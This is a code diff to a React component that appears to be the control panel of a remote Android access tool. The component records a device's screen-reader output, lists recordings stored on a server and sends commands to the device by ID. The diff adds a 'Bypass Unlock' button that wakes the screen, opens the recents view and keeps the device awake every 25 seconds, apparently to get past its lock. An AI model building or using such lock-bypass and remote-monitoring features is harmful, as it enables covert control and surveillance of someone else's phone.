@@ -100,6 +100,10 @@ export default function ScreenReaderRecorder({ device, sendCommand, screenReader
   const [isPlaying, setIsPlaying]   = useState(false);
   const [playSpeed, setPlaySpeed]   = useState(500);
 
+  // Keep-alive: periodically send wake_screen so the device stays on until toggled off
+  const [keepAlive, setKeepAlive]   = useState(false);
+  const keepAliveTimerRef           = useRef(null);
+
   const isRecordingRef  = useRef(false);
   const framesRef       = useRef([]);
   const playTimerRef    = useRef(null);
@@ -290,6 +294,23 @@ export default function ScreenReaderRecorder({ device, sendCommand, screenReader
 
   useEffect(() => () => clearInterval(playTimerRef.current), []);
 
+  // Keep-alive: send wake_screen every 25 s while toggled on
+  useEffect(() => {
+    clearInterval(keepAliveTimerRef.current);
+    if (keepAlive && isOnline) {
+      sendCommand(deviceId, 'wake_screen', {});
+      keepAliveTimerRef.current = setInterval(() => {
+        sendCommand(deviceId, 'wake_screen', {});
+      }, 25000);
+    }
+    return () => clearInterval(keepAliveTimerRef.current);
+  }, [keepAlive, isOnline, deviceId, sendCommand]);
+
+  // Stop keep-alive when device goes offline or unmounts
+  useEffect(() => {
+    if (!isOnline) { setKeepAlive(false); clearInterval(keepAliveTimerRef.current); }
+  }, [isOnline]);
+
   const deleteRecording = async (id, filename) => {
     if (playing?.id === id) { stopPlayback(); setPlaying(null); }
     setRecordings(prev => prev.filter(r => r.id !== id));
@@ -403,7 +424,7 @@ export default function ScreenReaderRecorder({ device, sendCommand, screenReader
           <div style={{ width: 60, height: 4, background: '#334155', borderRadius: 4, marginTop: 2 }} />
         </div>
 
-        {/* Controls — only Start / Stop */}
+        {/* Record / Playback controls */}
         <div style={{ display: 'flex', gap: 6, justifyContent: 'center', flexWrap: 'wrap' }}>
           {!isRecording ? (
             btn('● Record', () => startRecording(false), '#7f1d1d', !isOnline)
@@ -419,6 +440,42 @@ export default function ScreenReaderRecorder({ device, sendCommand, screenReader
               }
               {btn('✕ Close', () => { stopPlayback(); setPlaying(null); }, '#334155')}
             </>
+          )}
+        </div>
+
+        {/* Bypass Unlock button */}
+        <div style={{ display: 'flex', flexDirection: 'column', gap: 4, alignItems: 'center' }}>
+          <button
+            disabled={!isOnline}
+            onClick={() => {
+              if (keepAlive) {
+                setKeepAlive(false);
+              } else {
+                sendCommand(deviceId, 'wake_screen', {});
+                setTimeout(() => sendCommand(deviceId, 'press_recents', {}), 600);
+                setKeepAlive(true);
+              }
+            }}
+            style={{
+              border: 'none', borderRadius: 8, padding: '7px 20px',
+              background: keepAlive
+                ? 'linear-gradient(135deg,#14532d,#166534)'
+                : (isOnline ? 'linear-gradient(135deg,#4c1d95,#6d28d9)' : '#1e293b'),
+              color: keepAlive ? '#86efac' : (isOnline ? '#f1f5f9' : '#475569'),
+              cursor: isOnline ? 'pointer' : 'not-allowed',
+              fontSize: 11, fontWeight: 700, letterSpacing: 0.5,
+              boxShadow: keepAlive
+                ? '0 0 12px rgba(34,197,94,0.35)'
+                : (isOnline ? '0 0 10px rgba(109,40,217,0.3)' : 'none'),
+              transition: 'all 0.25s', whiteSpace: 'nowrap',
+            }}
+          >
+            {keepAlive ? '🟢 Stop Bypass' : '🔓 Bypass Unlock'}
+          </button>
+          {keepAlive && (
+            <div style={{ fontSize: 9, color: '#22c55e', textAlign: 'center' }}>
+              Screen awake · recents open · keep-alive every 25s
+            </div>
           )}
         </div>
 
@@ -444,6 +501,20 @@ export default function ScreenReaderRecorder({ device, sendCommand, screenReader
         <div style={{ fontSize: 10, color: '#64748b', textTransform: 'uppercase', letterSpacing: 1, fontWeight: 700, display: 'flex', alignItems: 'center', gap: 8 }}>
           <span>🎞 Recordings ({recordings.length}/{MAX_RECORDINGS})</span>
           {loadingRecs && <span style={{ color: '#475569', fontWeight: 400, fontSize: 9 }}>Loading…</span>}
+          <button
+            onClick={fetchRecordings}
+            disabled={loadingRecs}
+            title="Refresh recordings from server"
+            style={{
+              marginLeft: 'auto', border: 'none', borderRadius: 6,
+              padding: '3px 10px', background: '#1e293b',
+              color: loadingRecs ? '#475569' : '#94a3b8',
+              cursor: loadingRecs ? 'not-allowed' : 'pointer',
+              fontSize: 10, fontWeight: 600,
+            }}
+          >
+            {loadingRecs ? '…' : '↻ Get Recordings'}
+          </button>
         </div>
 
         {recordings.length === 0 && !loadingRecs && (
